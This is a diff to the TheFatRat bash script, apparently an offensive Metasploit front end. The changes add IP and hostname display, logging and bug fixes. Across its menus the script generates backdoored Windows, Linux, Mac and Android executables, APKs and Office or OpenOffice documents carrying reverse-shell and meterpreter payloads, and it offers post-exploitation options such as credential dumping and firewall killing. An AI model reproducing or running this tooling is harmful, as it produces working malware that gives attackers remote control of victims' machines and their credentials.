@@ -27,14 +27,30 @@ BlueF='\e[1;34m' #Biru
 RESET="\033[00m" #normal
 orange='\e[38;5;166m'
 
+#Accurate method to detect user Distro
+lnx="Linux"
+lsb_release -i > temp/distro.tmp
+lsb_release -c > temp/codename.tmp
+rlname=`awk '{print $2}' temp/codename.tmp`
+dist=`awk '{print $3}' temp/distro.tmp`
+dist1=`awk '{print $4}' temp/distro.tmp`
+rm -f temp/codename.tmp >/dev/null
+rm -f temp/distro.tmp >/dev/null
+if [ "$dist" == "$lnx" ];
+then 
+dist0=$dist1  
+else
+dist0=$dist
+fi
+
 #SAMARAN TAMPAN
 
 path=`pwd`
 Versi=1.9.2
 codename=Whistle
 OS=`uname` #
-distro="$(awk -F '=' '/^ID=/ {print $2}' /etc/os-release 2>&-)"
-disrov="$(awk -F '=' '/^VERSION_ID=/ {print $2}' /etc/os-release 2>&-)"
+distro=$dist0
+disrov=$rlname
 SERVICE=service;
 apkembed='tools/apkembed.rb' # exec script path
 pwned='python tools/pw_exec.py'
@@ -56,7 +72,10 @@ temp=$path/temp
 file="config/config.path"
 meterp="$path/temp/meterpreter.rc"
 outf="app_backdoor.apk"
-
+msploit=$path/logs/msploit.log
+lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
+publicip=`dig +short myip.opendns.com @resolver1.opendns.com`
+hostn=`host $publicip | awk '{print $5}'`
 
 # spinner for Metasploit Generator
 spinlong ()
@@ -124,16 +143,32 @@ cat << !
 !
 }
 
+#Microsploit log file
+msploitr () 
+{
+rm -rf $msploit >/dev/null 2>&1
+touch $msploit
+echo "**********************************************" > $msploit
+echo "*           Microsploit    Log               *" >> $msploit
+echo "**********************************************" >> $msploit
+echo "             Metepreter Data                  " >> $msploit
+echo "----------------------------------------------" >> $msploit
+cat $meterp | while read LINE
+do
+echo $LINE >> $msploit
+done
+echo "----------------------------------------------" >> $msploit
+echo "              Xterm Output                    " >> $msploit
+echo "----------------------------------------------" >> $msploit
 
-
-
+}
 
 #Checking
 [[ `id -u` -eq 0 ]] || { echo -e $red "Must be root to run script"; exit 1; }
 resize -s 33 84 > /dev/null
 clear
 
-#cek config
+#check config
 
 if [ -f "$file" ]
 then
@@ -190,6 +225,7 @@ if [ $(id -u) != "0" ]; then
       sleep 2
       echo [✔]::[Check User]: $USER ;
       echo [✔]::[Distro]: $distro ;
+      echo [✔]::[Release]: $rlname ;
       sleep 1
       echo [x]::[not root]: you need to be [root] to run this script.;
       echo ""
@@ -202,6 +238,7 @@ else
    echo [!]::[Check Dependencies]: ;
    sleep 1
    echo [✔]::[Distro]: $distro ;
+   echo [✔]::[Release]: $rlname ;
    echo [✔]::[Check User]: $USER ;
 
 
@@ -580,7 +617,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 				spinlong
@@ -596,7 +637,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/powershell_bind_tcp" FALSE "windows/powershell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
          			echo ""
@@ -611,7 +656,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 				echo ""
@@ -626,7 +675,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -641,7 +694,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -656,7 +713,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -671,7 +732,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -686,7 +751,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -701,7 +770,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -716,7 +789,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -731,7 +808,11 @@ echo ""
 				then
 				echo ""
 				spinlong
-				echo ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira
 				spinlong
 				echo ""
@@ -748,6 +829,10 @@ echo ""
          				echo
 					echo -e $yellow"  Worked on Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] "
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -778,6 +863,10 @@ echo ""
 				   	echo
   					echo -e $yellow"  Worked on All Windows "
   					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
   					echo -ne "  SET LHOST : ";tput sgr0
   					read yourip
   					echo ""
@@ -858,7 +947,11 @@ echo -e $okegreen"  ============================================================
            	 		echo use exploit/multi/handler > "temp/meterpreter_linux.rc"
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "linux/ppc/shell_reverse_tcp" FALSE "linux/x86/shell_reverse_tcp" FALSE "linux/x86/meterpreter/reverse_tcp" FALSE "osx/armle/shell_reverse_tcp" FALSE "osx/ppc/shell_reverse_tcp" FALSE "bsd/x86/shell/reverse_tcp" FALSE "solaris/x86/shell_reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
            	 		echo set PAYLOAD $payload >> "temp/meterpreter_linux.rc"
-				echo -e $okegreen ""
+				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_linux.rc"
            	 		read -p '  Set LPORT: ' uservar
@@ -876,6 +969,10 @@ echo -e $okegreen"  ============================================================
            	 		echo set PAYLOAD $payload >> "temp/meterpreter_windows.rc"
 				pe=$(zenity --list --title "☣ TheFatRat ☣" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "auto_migrate+killfirewall.rc" --width 350 --height 240) > /dev/null 2>&1
 				echo -e $okegreen ""
+                                echo -e $yellow "Your local IP address is : $lanip"
+                                echo -e $yellow "Your public IP address is : $publicip"
+                                echo -e $yellow "Your Hostname is : $hostn"
+                                echo -e $green ""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_windows.rc"
            	 		read -p '  Set LPORT: ' uservar
@@ -892,6 +989,10 @@ echo -e $okegreen"  ============================================================
            	 		echo use exploit/multi/handler > "temp/meterpreter_mac.rc"
            	 		echo set PAYLOAD osx/x86/shell_reverse_tcp >> "temp/meterpreter_mac.rc"
 				echo -e $okegreen ""
+                                echo -e $yellow "Your local IP address is : $lanip"
+                                echo -e $yellow "Your public IP address is : $publicip"
+                                echo -e $yellow "Your Hostname is : $hostn"
+                                echo -e $green ""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_mac.rc"
            	 		read -p '  Set LPORT: ' uservar
@@ -909,6 +1010,10 @@ echo -e $okegreen"  ============================================================
 				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
            	 		echo set PAYLOAD $payload >> "temp/meterpreter_android.rc"
 				echo -e $okegreen ""
+                                echo -e $yellow "Your local IP address is : $lanip"
+                                echo -e $yellow "Your public IP address is : $publicip"
+                                echo -e $yellow "Your Hostname is : $hostn"
+                                echo -e $green ""
            	 		read -p '  Set LHOST IP: ' uservar
            	 		echo set LHOST $uservar >> "temp/meterpreter_android.rc"
            	 		read -p '  Set LPORT: ' uservar
@@ -977,6 +1082,10 @@ case $choice in
    1)
           echo -e $red"   Worked on Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] "
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1002,21 +1111,41 @@ case $choice in
           echo "set FILENAME $fira.doc" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+          cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
+
          	echo ""
-         	mv ~/.msf4/local/$fira.doc $path/output/$fira.doc
+         	mv ~/.msf4/local/$fira.doc $path/output/$fira.doc >/dev/null 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.doc "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+                fidoc=$path/output/$fira.doc
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.doc "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
  ;;
 
 2)
           echo -e $red"\n   Worked on Microsoft Office on Windows  "
 					echo -e $okegreen""
+                                        echo -e $yellow "Your local IP address is : $lanip"
+                                        echo -e $yellow "Your public IP address is : $publicip"
+                                        echo -e $yellow "Your Hostname is : $hostn"
+                                        echo -e $okegreen ""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1058,16 +1187,32 @@ case $choice in
           echo "set BODY $bodys" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+
+         	fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 
 						elif [ $exe != 'n' ] && [ $exe != 'N' ]
 							then
@@ -1093,22 +1238,42 @@ case $choice in
           echo "set EXE::Custom $exef" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
 					echo ""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	
+                fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 fi
 ;;
 
 3)
           echo -e $red"   Worked on Libre Office on Mac ( Python )  "
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1154,16 +1319,32 @@ fi
           echo "set target 1" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-    			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+    			mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
         	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	
+                fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 						elif [ $exe != 'n' ] && [ $exe != 'N' ]
 							then
 					#payload y
@@ -1190,21 +1371,40 @@ fi
           echo "set target 1" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm
+         	mv ~/.msf4/local/$fira.docm $path/output/$fira.docm >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	fidoc=$path/output/$fira.docm
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.docm "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 ;;
 
 4)
-          cho -e $red"   Apache OpenOffice on Windows (PSH) "
+          echo -e $red"   Apache OpenOffice on Windows (PSH) "
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1241,17 +1441,40 @@ fi
           echo "set BODY $bodys" >> $meterp
           echo "exploit -z" >> $meterp
           echo "exit -y" >> $meterp
-          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+          xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt
+         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
-          microsploecho -e $red"   Apache OpenOffice on Linux (PSH) "
+         	fidoc=$path/output/$fira.odt
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
+;;
+
+      5)
+                   echo -e $red"   Apache OpenOffice on Linux (PSH) "
 					echo -e $okegreen""
+                                        echo -e $yellow "Your local IP address is : $lanip"
+                                        echo -e $yellow "Your public IP address is : $publicip"
+                                        echo -e $yellow "Your Hostname is : $hostn"
+                                        echo -e $okegreen ""
 					echo -ne "   SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1288,16 +1511,31 @@ fi
           echo "set BODY $bodys" >> $meterp
           echo "exploit" >> $meterp
           echo "exit -y" >> $meterp
-         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp"
+          msploitr
+         	xterm -T " TheFatRat < DOC BUILDER > " -geometry 110x23 -e "$msfconsole -r $meterp | tee $path/temp/xterm.tmp"
           rm -rf $meterp >/dev/null 2>&1
+                cat $path/temp/xterm.tmp | while read LINE
+                do
+                echo $LINE >> $msploit
+                done
+                rm -rf $path/temp/xterm.tmp >/dev/null 2>&1
          	echo ""
-         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt
+         	mv ~/.msf4/local/$fira.odt $path/output/$fira.odt >>$msploit 2>&1
          	echo -e $okegreen""
-         	echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
-					sleep 2
-					echo ""
-          read -rsp $'Press any key to return to menu\n' -n 1 key
+         	fidoc=$path/output/$fira.odt
+                if [ -f "$fidoc" ]
+                then
+                echo -e $yellow"  Backdoor doc Saved To : $path/output/$fira.odt "
+                echo -e
+                read -rsp $'Press any key to return to menu\n' -n 1 key
           microsploit
+         	else
+                echo -e $red "There was a problem in the creation of your Backdoor DOC ,
+check $path/logs/msploit.log for more information about the error ."
+                echo -e $green ""
+                read -rsp $'Press any key to return to menu\n' -n 1 key
+          microsploit
+fi
 ;;
         6)
         clear
@@ -1333,8 +1571,10 @@ rm -rf output/*
 sleep 2
 echo "Done!"
 echo -e $okegreen""
-echo -e $okegreen""
-sleep 1
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 echo -ne " SET LHOST : ";tput sgr0
 read yourip
 echo ""
@@ -1501,6 +1741,10 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 				then
 					echo ""
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1531,6 +1775,10 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					then
 					echo ""
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1574,6 +1822,11 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					echo -e $okegreen " Starting Apache Server wait ..."
 					service apache2 start > /dev/null 2>&1
 					echo ""
+echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1613,6 +1866,10 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					then
 					echo ""
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1655,6 +1912,10 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
 					echo
 					echo -e $yellow"  Worked on Adobe Reader v8.x, v9.x / Windows XP SP3 / Windows 7/Vista ( English )"
 					echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 					echo -ne "  SET LHOST : ";tput sgr0
 					read yourip
 					echo ""
@@ -1702,6 +1963,10 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
         then
         echo ""
         echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
         echo -ne "  SET LHOST : ";tput sgr0
         read yourip
         echo ""
@@ -1905,6 +2170,10 @@ echo -e $red"  	     Powershell$cyan Injection attacks on any$red Windows Platfo
       then
       echo ""
       echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
       echo -ne "  SET LHOST : ";tput sgr0
       read yourip
       echo ""
@@ -2145,6 +2414,11 @@ fi
 # Random Msfencode encoding iterations
 #ITER=`seq 5 10 |sort -R |sort -R | head -1`
 ITER=`shuf -i 10-20 -n 1`
+echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
 echo -ne  $cyan"TYPE YOUR LHOST : $okegreen" ;
 read IP
 echo ""
@@ -2418,7 +2692,11 @@ menu () {
   			then
   				echo ""
   				spinlong
-  				echo ""
+  				echo -e $okegreen""
+echo -e $yellow "Your local IP address is : $lanip"
+echo -e $yellow "Your public IP address is : $publicip"
+echo -e $yellow "Your Hostname is : $hostn"
+echo -e $okegreen ""
   				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira;
           embed=$(zenity --file-selection --file-filter='EXE files (exe) | *.exe' --title="Select your executable file");
